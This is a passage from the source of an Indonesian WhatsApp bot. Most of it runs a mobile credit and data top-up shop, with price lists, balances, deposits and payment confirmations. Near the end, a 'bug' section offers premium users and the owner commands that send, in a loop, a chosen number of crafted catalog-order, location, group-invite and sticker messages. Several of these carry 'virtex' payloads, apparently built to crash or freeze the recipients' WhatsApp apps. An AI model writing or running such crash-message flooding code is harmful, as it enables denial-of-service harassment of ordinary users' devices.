                                                    title: "Melakukan Topup Kuota Axis",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'indosat': {
 if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA INDOSAT*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "INDOSAT" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota Indosat",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota Indosat",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota Indosat",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'three': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA THREE*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "TRI" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota Three",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota Three",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota Three",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'byu': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA BYU*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "by.U" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota by.U",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota by.U",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota by.U",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'xl': {
 if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA KUOTA XL*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "XL" && i.type !== "Pulsa Transfer" && i.category !== "Pulsa Reguler" && i.type !== "Voucher") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Kuota XL",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Kuota XL",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Kuota XL",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break

//============================//
 case 'setprofit':{
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Gunakan dengan kata command: ${prefix+command} 20%\n\n_Text 20% bisa kalian ganti dengan seberapa besar Keuntungan Yg Akan anda Peroleh_`)
if (q.replace(/[^0-9]/g, '') < 1) return reply('Minimal 1%')
if (q.replace(/[^0-9]/g, '') > 99) return reply('Maksimal 99%')
untung = q.replace(/[^0-9]/g, '')
await reply(`Profit Anda telah distel menjadi ${q.replace(/[^0-9]/g, '')}%`)
}
break
case 'proses':{
if (isGroup ) return onlyPrivate()
let tek = Ehztext(`「 *TRANSAKSI PENDING* 」\n\n\`\`\`🎀 PRODUK : ${q}\n📆 TANGGAL : ${calender}\n⌚ JAM     : ${timeWib}\n✨ STATUS  : Pending\`\`\`\n\n*--------------------------*\n\n*Pesanan ini akan diproses manual oleh admin,* *Tunggu admin memprosesnya??*\n*Atau Chat : Wa.me//${global.nomerOwner}*`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE SAYA TUNGGU👍' }, type: 1 },
]
hanz.sendMessage(from,
{text: tek})
hanz.sendMessage(`${global.ownerNumber}`, {text: `*👋HALLO OWNER KU, ADA YANG ORDER PRODUK ${q} NIH*\n\n*DARI* : ${sender.split('@')[0]}`})
}
break
case 'done':{
if (isGroup) return onlyPrivate()
let tek = Ehztext(`「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${calender}\n⌚ JAM     : ${timeWib}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih Telah order di *${global.nameToko}*\nNext Order ya🙏`)
let btn_menu = [
{buttonId: `${prefix}aokeguwgw`, buttonText: { displayText: 'OKE THENKS👍' }, type: 1 },
]
hanz.sendMessage(from,
{text: tek})
}
break
case 'cekip':{
if (!isOwner) return onlyOwner()
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
fetch("https://atlantich2h.com/get_profile", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
if (!res.status) return reply('Silahkan sambungkan ip ('+res.message.replace(/[^0-9.]+/g, '')+') tersebut ke provider')
reply('IP sudah tersambung ke server.')
})
}
break
case 'saldo':{
//if (isGroup) return reply('husus private chat')
let cnah = Ehztext(`*━━ CHECK YOUR INFO ━━* 

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
${gris}Saldo hanya bisa untuk topup
Tidak bisa ditarik atau transfer!${gris} `)
setReply(cnah)
}
break
case 'addsaldo':
    if (!isOwner) return onlyOwner();
    if (!q) return setReply(`Ex : ${prefix+command} Nomor|Jumlah\n\nContoh :\n${prefix+command} 628817839722|20000`);
    if (!q.split("|")[0]) return setReply(`Ex : ${prefix+command} Nomor|Jumlah\n\nContoh :\n${prefix+command} 628817839722|20000`);
    if (!q.split("|")[1]) return setReply(`Ex : ${prefix+command} Nomor|Jumlah\n\nContoh :\n${prefix+command} 628817839722|20000`);

    let targetNumber = q.split("|")[0];
    let amount = Number(q.split("|")[1]);
    addSaldo(`${targetNumber}@s.whatsapp.net`, amount, db_saldo);

    await sleep(50);

    let message = `「 *SALDO USER* 」\n\n` +
                  `⭔ ID: ${targetNumber}\n` +
                  `⭔ Nomor: ${targetNumber}\n` +
                  `⭔ Tanggal: ${week}, ${calender}\n` +
                  `⭔ Saldo: Rp${toRupiah(cekSaldo(`${targetNumber}@s.whatsapp.net`, db_saldo))}`;

    // Kirim pesan ke grup
    hanz.sendMessage(from, { text: message });

    // Kirim pesan ke nomor target
    hanz.sendMessage(`${targetNumber}@s.whatsapp.net`, { text: message });
    
    break;
case 'minsaldo':
    if (!isOwner) return onlyOwner();
    if (!q) return setReply(`Ex : ${prefix + command} Nomor|Jumlah\n\nContoh :\n${prefix + command} 628817839722|20000`);
    if (!q.split("|")[0]) return setReply(`Ex : ${prefix + command} Nomor|Jumlah\n\nContoh :\n${prefix + command} 628817839722|20000`);
    if (!q.split("|")[1]) return setReply(`Ex : ${prefix + command} Nomor|Jumlah\n\nContoh :\n${prefix + command} 628817839722|20000`);

    let targetNumber1 = q.split("|")[0];
    let amount2 = Number(q.split("|")[1]);
    let currentBalance = cekSaldo(`${targetNumber1}@s.whatsapp.net`, db_saldo);

    if (currentBalance == 0) return reply("Dia belum terdaftar di database saldo.");
    if (currentBalance < amount2 && currentBalance !== 0) return reply(`Dia saldonya ${currentBalance}, jadi jangan melebihi ${currentBalance} yah banh??`);

    // Mengurangi saldo target
    minSaldo(`${targetNumber1}@s.whatsapp.net`, amount2, db_saldo);
    await sleep(50);

    // Format pesan
    let message1 = `「 *SALDO USER* 」\n\n` +
                  `⭔ ID: ${targetNumber1}\n` +
                  `⭔ Nomor: ${targetNumber1}\n` +
                  `⭔ Tanggal: ${week}, ${calender}\n` +
                  `⭔ Saldo: Rp${toRupiah(cekSaldo(`${targetNumber1}@s.whatsapp.net`, db_saldo))}`;

    // Kirim pesan ke grup atau pengirim
    hanz.sendMessage(from, { text: message1 });

    break;


case 'ceksaldo':{
if (!isOwner) return onlyOwner()
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
fetch("https://atlantich2h.com/get_profile", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
if (!res.status) return reply('Silahkan sambungkan ip ('+res.message.replace(/[^0-9.]+/g, '')+') tersebut ke provider')
setReply(`*ATLANTIC PEDIA PROFILE*\n*Name:* ${res.data.name}\n*Username:* ${res.data.username}\n*Email:* ${res.data.email}\n*Sisa Saldo:* Rp${toRupiah(res.data.balance)}`)
})
}
break
case 'topup':{
if (cekSaldo(sender, db_saldo) < 1) return setReply(`Maaf *${pushname}*, sepertinya saldo kamu Rp${toRupiah(cekSaldo(sender, db_saldo))}, silahkan melakukan deposit terlebih dahulu sebelum melakukan topup.`)
if (!q) return reply(`Ingin Topup? silahkan ketik .pricelist`)
if (!fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
let cekhar = new URLSearchParams()
cekhar.append("api_key", apikeyAtlantic)
cekhar.append("type", "prabayar")
fetch("https://atlantich2h.com/layanan/price_list", {
method: "POST",
body: cekhar,
redirect: 'follow'
})
.then(responsee => responsee.json())
.then(ress => {
let listproduk
for (let x of ress.data) {
if (x.code == q.split(",")[0]) {
listproduk = x ? x : false
}
}
if (!listproduk) return reply(`_Code produk *${q.split(",")[0]}* Tidak sesuai_`)
let kntungan = (untung / 100) * listproduk.price.replace(/[^0-9]/g, '')
if (cekSaldo(sender, db_saldo) < Number(listproduk.price.replace(/[^0-9]/g, '')) + Number(Math.ceil(kntungan))) return reply(`Maaf *${pushname},*\n🍁saldo anda kurang dari Rp${toRupiah(Number(listproduk.price.replace(/[^0-9]/g, '')) + Number(Math.ceil(kntungan)))}, Silahkan Ketik .deposit Untuk melakukan deposit`)
var object_buy = {
	session: "target",
number: sender,
result: "",
data: {
target: "",
code: q,
idtopup: "",
id: "",
price: "",
layanan: ""
}
}
fs.writeFile(topupPath + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
	setReply(`_Silakan masukkan ID atau nomor target Anda sesuai dengan jenis top-up yang ingin dilakukan:_\n\n` +
    `✨ **Untuk Top-up Game:**\n` +
    `Pastikan ID dan zone digabung tanpa karakter lain.\n` +
    `Contoh salah: 733383273(8294) ❌\n` +
    `Contoh benar: 7333832738294 ✅\n` +
    `Contoh ID Game: *1234567890*\n\n` +
    `📱 **Untuk Top-up Pulsa:**\n` +
    `Masukkan nomor yang benar tanpa tanda atau spasi.\n` +
    `Contoh nomor pulsa: *0813××××××*\n\n` +
    `💻 **Untuk Top-up Kuota:**\n` +
    `Silakan masukkan nomor tujuan dengan benar.\n` +
    `Contoh nomor kuota: *08581×××××*\n\n` +
    `💰 **Untuk Top-up Price Wallet/Saldo:**\n` +
    `Kirimkan nomor yang benar sesuai dengan akun Anda.\n` +
    `Contoh nomor saldo: *082381×××××*\n\n` +
    `Pastikan semua informasi sudah sesuai untuk memastikan proses top-up berjalan lancar!`)
});

})
} else {
reply(`Kamu sedang melakukan topup, mohong tunggu sampai proses topup selesai.`)
}
}
break
case 'bukti':
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return reply(`Maaf *@${sender.split('@')[0]}* sepertinya kamu belum pernah melakukan deposit`)
if (isImage && isQuotedImage) return setReply(`Kirim gambar dengan caption *.bukti* atau reply gambar yang sudah dikirim dengan caption *.bukti*`)
await hanz.downloadAndSaveMediaMessage(quoted,"image", `./database/deposit/${sender.split('@')[0]}.jpg`)

let oke_bang = fs.readFileSync(`./database/deposit/${sender.split('@')[0]}.jpg`)
let data_depo = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))

let caption_bukti = Ehztext(`「 *DEPOSIT USER* 」
⭔ID: ${data_depo.ID}
⭔Nomer: @${data_depo.number.split('@')[0]}
⭔Payment: ${data_depo.payment}
⭔Tanggal: ${data_depo.date.split(' ')[0]}
⭔Jumlah Deposit: Rp${toRupiah(data_depo.data.amount_deposit)}
⭔Pajak Admin : Rp0
⭔Total Pembayaran : Rp${toRupiah(data_depo.data.amount_deposit)}

Ada yang deposit nih banh, coba dicek saldonya, jika sudah masuk konfirmasi

Jika sudah masuk konfirmasi dengan cara klik *.accdepo*
Jika belum masuk batalkan dengan cara ketik *.rejectdepo*`)

let bukti_bayar = {
    image: oke_bang , // Pastikan `oke_bang` adalah URL gambar
    caption: caption_bukti, // Caption yang ingin Anda sertakan
};

// Kirim pesan ke nomor pemilik
await hanz.sendMessage(`${global.ownerNumber}@s.whatsapp.net`, bukti_bayar);

reply(`Mohon tunggu ya banh, sampai di Konfirmasi oleh owner 🔥`)
fs.unlinkSync(`./database/deposit/${sender.split('@')[0]}.jpg`)
break
case 'accdepo':{
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Contoh: ${prefix+command} 628xxx`)
let orang = q.split(",")[0].replace(/[^0-9]/g, '')
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
addSaldo(data_deposit.number, Number(data_deposit.data.amount_deposit), db_saldo)
var text_sukses = Ehztext(`「 *DEPOSIT SUKSES* 」
⭔ID : ${data_deposit.ID}
⭔Nomer: @${data_deposit.number.split('@')[0]}
⭔Nomer: ${data_deposit.number.split('@')[0]}
⭔Payment: ${data_deposit.payment}
⭔Tanggal: ${data_deposit.date.split(' ')[0]}
⭔Jumlah Deposit: Rp${toRupiah(data_deposit.data.amount_deposit)}`)
reply(`${text_sukses}\n`)
hanz.sendMessage(data_deposit.number, { text: `${text_sukses}\n\n_Deposit kamu telah dikonfirmasi oleh admin, silahkan cek saldo dengan cara ketik #saldo_`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'rejectdepo':{
if (!isOwner) return onlyOwner()
if (!q) return reply(`Contoh: ${prefix+command} 628xxx`)
let orang = q.split(",")[0].replace(/[^0-9]/g, '')
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
reply(`Sukses Reject  Deposit `)
hanz.sendMessage(data_deposit.number, { text: `Maaf Deposit Dengan ID : *${data_deposit.ID}* Ditolak, Jika ada kendala hubungin Owner Bot.\nwa.me/${global.ownerNumber}`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'tutortopup':{
 let linktutor = `Nih Kak Tutor Nya Disini\nhttps://youtu.be/lKfgv1-3Ty4?si=y4SDeBGhifxKwXMC`
 setReply(linktutor)
 }
break
case 'tutordepo':{
 let linktutor = `Nih Kak Tutor Nya Disini\nhttps://youtu.be/lKfgv1-3Ty4?si=y4SDeBGhifxKwXMC`
 setReply(linktutor)
}
break
case 'deposit':
case 'depo': {
 // if (isGroup) return setReply('Hanya untuk obrolan pribadi.');

    var teks = {
        text: Ehztext(`*| 𝗠𝗘𝗡𝗨 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 |*
        -----------------------------------------------------
        𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝗉𝗂𝗅𝗂𝗁 𝗉𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇 𝗂𝗌𝗂 𝗌𝖺𝗅𝖽𝗈 𝗒𝖺𝗇𝗀 𝗄𝖺𝗆𝗎 𝗂𝗇𝗀𝗂𝗇𝗄𝖺𝗇, 𝗁𝖺𝗇𝗒𝖺 𝗍𝗂𝗇𝗀𝗀𝖺𝗅 klik 𝗉𝗂𝗅𝗂𝗁𝖺𝗇 𝗉𝖾𝗆𝖻𝖺𝗒𝖺𝗋𝖺𝗇 𝗂𝗌𝗂 𝗌𝖺𝗅𝖽𝗈 𝗒𝖺𝗇𝗀 𝗍𝖾𝗅𝖺𝗁 𝖽𝗂𝗌𝖾𝖽𝗂𝖺𝗅𝖺𝗻
        -----------------------------------------------------
        𝖲𝖺𝗅𝖽𝗈 𝗁𝖺𝗇𝗒𝖺 𝖻𝗂𝗌𝖺 𝖽𝗂𝗀𝗎𝗻𝖺𝗄𝖺𝗇 𝗎𝗻𝗍𝗎𝗸 𝗍𝗈𝗉𝗎𝗉 𝗌𝖺𝗃𝖺, 𝗍𝗂𝖽𝖺𝗄 𝖻𝗂𝗌𝖺 𝖽𝗂𝗋𝖾𝖿𝗎𝗇𝖽 𝖺𝗍𝖺𝗎 𝖽𝗂𝖺𝗆𝖻𝗂𝗅 𝗄𝖾𝗆𝖻𝖺𝗹𝗂, 𝗆𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝗄𝖺𝗇 𝖿𝗂𝗍𝗎𝗋 𝗂𝗇𝗂 𝖻𝖾𝗋𝖺𝗋𝗍𝗂 𝗄𝖺𝗆𝗎 𝗌𝖾𝗍𝗎𝗃𝗎 𝖽𝖾𝗇𝗀𝖺𝗇 𝗌𝗒𝖺𝗋𝖺𝗍 𝖽𝖺𝗻 𝗄𝖾𝗍𝖾𝗇𝗍𝗎𝖺𝗇 𝗒𝖺𝗇𝗀 𝖻𝖾𝗋𝗅𝖺𝗄𝗎\n\nJika Tidak Terlihat Tombol Nya Maka Silakan Ketik *payqris* atau ingin *paydana* 
        -----------------------------------------------------`)
    };

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks.text, // Menambahkan teks ke dalam body
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: botName
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "single_select",
                                "buttonParamsJson": 
`{"title":"Pilih Disini",
"sections":[{"title":"Melakukan deposit",
"rows":[{"header":"payqris",
"title":"QRIS",
"description":"Sistem: Otomatis",
"id":"payqris"}, // Ganti id sesuai dengan button
{"header":"E WALLET",
"title":"paydana",
"description":"Sistem: manual",
"id":"paydana"}] // Ganti id sesuai dengan button
}]
}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid,
                            newsletterName,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: m });

    await hanz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case 'sendqr':{
	if (!isOwner) return onlyOwner()
	if (!q) return reply('*Contoh:*\n.add 628xxx')
	var number = q.replace(/[^0-9]/gi, '')+'@s.whatsapp.net'
let tekssss = Ehztext(`───「  *PAYMENT*  」────

- *Dana :* ${global.dana}
- *Gopay :*  Scan qr di atas
- *Ovo :* Scan qr di atas
- *Qris :* Scan qr di atas

_Pembayaran ini Telah di kirim oleh Admin_
_Melalui bot ini🙏_


OK, thanks udah order di \n*${global.nameToko}*
`)
hanz.sendMessage(number, { image: fs.readFileSync(`./stik/qris.jpg`),
 caption: tekssss, 
footer: `${global.ownerName} © 2022`},
{quoted: m})
reply (`Suksess Owner ku tercinta 😘🙏`)
}
break
// ============== FITUR UG ===========//
case 'bugkatalog': {
if (!isPremium) return reply('Khusud Prem Yang Mau Buy Prem Ke Owner')
let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input
for (let i = 0; i < jumlah; i++) {
var product = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "765937258632808",
"thumbnail": thumb,
"itemCount": 99,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${virtex3(prefix)}`,
"orderTitle": "ALBYS",
"sellerJid": "123233@s.whatsapp.net",
"token": "AR7vqqKIzgmGVVJPi3iEdmJF1xOnAfzkunMEJDF+0WlNMA==",
"totalAmount1000": "1260000000",
"totalCurrencyCode": "IDR"
}
}), { userJid: from, quoted:m})
hanz.relayMessage(from, product.message, { messageId: product.key.id })
}
    setReply(`Berhasil mengirim ${jumlah} troli.`);
}
        break
    case "buglokasi":{
 if (!isPremium) return onlyPrem()
let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input
for (let i = 0; i < jumlah; i++) {
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
    "degreesLatitude": -7.350000,  // Latitude Tasikmalaya
    "name": `${virtex9(prefix)}`,  // Nama lokasi atau pesan
    "degreesLongitude": 108.217000,  // Longitude Tasikmalaya


					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
hanz.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
setReply(`Berhasil mengirim ${jumlah} lokasi.`);
}
break

											
										
    case 'buginvit': {
if (!isOwner) return onlyOwner()
    // Ambil jumlah dari input pengguna
    let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input jumlah

    // Loop untuk mengirim undangan sesuai jumlah yang diinginkan
    for (let i = 0; i < jumlah; i++) {
        // Buat pesan undangan grup
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us", // Ganti dengan Group JID sebenarnya
                "inviteCode": "/RwWifkIpEQUesVv", // Ganti dengan kode undangan grup yang valid
                "inviteExpiration": "1709614188", // Ganti dengan tanggal kedaluwarsa yang sesuai (timestamp)
                "groupName": `${virtex(prefix)}`, // Nama grup yang diundang
                "caption": `${virtex(prefix)}` // Pesan yang akan dikirimkan
            }
        }), { userJid: from, quoted: m });

        // Kirim pesan undangan grup
        await hanz.relayMessage(from, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Berikan respons setelah semua undangan dikirim
    setReply(`Berhasil mengirim ${jumlah} undangan grup.`);
}
break;

case 'bugstik':{
if (!isOwner) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
const jumlah = `${encodeURI(q)}`
let ydd = `Hallo Aku bot wea`
for (let i = 0; i < jumlah; i++) {
hanz.sendMessage(from, {sticker:{ url:stikBug}},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
